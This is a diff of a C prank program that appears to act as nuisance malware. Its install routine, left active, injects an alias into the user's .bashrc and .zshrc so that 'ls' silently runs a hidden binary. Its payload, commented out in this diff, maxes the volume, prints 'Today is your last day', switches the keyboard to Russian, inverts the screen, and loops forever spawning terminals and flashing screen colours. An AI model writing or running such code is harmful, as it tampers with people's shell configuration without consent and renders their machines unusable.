@@ -99,6 +99,7 @@ void writeSlow(char *str)
 void install(char *path)
 {
     char *old_bashrc = read_file(path, 100);
+
     if (old_bashrc != NULL) {
         char *alias = strdup("\n\
 alias ls=\"cd ~/.cat; ./a.out\"\n\
@@ -119,34 +120,62 @@ int main (int ac, char **av)
         printf("install\n");
         install("../.bashrc");
         install("../.zshrc");
+    } else {
+        printf("TRAUMATEK\n");
+
+        // sfMusic* Nyan =  sfMusic_createFromFile("nyanCat.wav");
+        // sfMusic_setLoop(Nyan, sfTrue);
+
+        // srand(time(NULL));
+        // system("clear");
+        // writeSlow("Today is your last day");
+        // system("amixer set Master on");
+        // system("amixer set Master 100%+");
+        // sfMusic_play(Nyan);
+        // sleep(2);
+
+        // system("setxkbmap ru");
+
+        // system("xrandr -o inverted");
+        
+        // while (1) {
+        //     system("amixer set Master on");
+        //     system("amixer set Master 100%+");
+        //     system("xrandr --output eDP-1 --gamma 0.1:1:0.1");
+        //     system("xrandr --output eDP-1 --gamma 0.1:0.1:1");
+        //     system("xrandr --output eDP-1 --gamma 1:0.1:0.1");
+        //     system("xrandr --output eDP-1 --gamma 0.1:1:1");
+        //     system("xrandr --output eDP-1 --gamma 1:1:0.1");
+        //     system("xfce4-terminal");
+        // }
     }
 
 
-    sfMusic* Nyan =  sfMusic_createFromFile("nyanCat.wav");
-    sfMusic_setLoop(Nyan, sfTrue);
+    // sfMusic* Nyan =  sfMusic_createFromFile("nyanCat.wav");
+    // sfMusic_setLoop(Nyan, sfTrue);
 
-    srand(time(NULL));
-    system("clear");
-    writeSlow("Today is your last day");
-    system("amixer set Master on");
-    system("amixer set Master 100%+");
-    sfMusic_play(Nyan);
-    sleep(2);
+    // srand(time(NULL));
+    // system("clear");
+    // writeSlow("Today is your last day");
+    // system("amixer set Master on");
+    // system("amixer set Master 100%+");
+    // sfMusic_play(Nyan);
+    // sleep(2);
 
-    system("setxkbmap ru");
+    // system("setxkbmap ru");
 
-    system("xrandr -o inverted");
+    // system("xrandr -o inverted");
     
-    while (1) {
-        system("amixer set Master on");
-        system("amixer set Master 100%+");
-        system("xrandr --output eDP-1 --gamma 0.1:1:0.1");
-        system("xrandr --output eDP-1 --gamma 0.1:0.1:1");
-        system("xrandr --output eDP-1 --gamma 1:0.1:0.1");
-        system("xrandr --output eDP-1 --gamma 0.1:1:1");
-        system("xrandr --output eDP-1 --gamma 1:1:0.1");
-        system("xfce4-terminal");
-    }
+    // while (1) {
+    //     system("amixer set Master on");
+    //     system("amixer set Master 100%+");
+    //     system("xrandr --output eDP-1 --gamma 0.1:1:0.1");
+    //     system("xrandr --output eDP-1 --gamma 0.1:0.1:1");
+    //     system("xrandr --output eDP-1 --gamma 1:0.1:0.1");
+    //     system("xrandr --output eDP-1 --gamma 0.1:1:1");
+    //     system("xrandr --output eDP-1 --gamma 1:1:0.1");
+    //     system("xfce4-terminal");
+    // }
 
     return 0;
 }
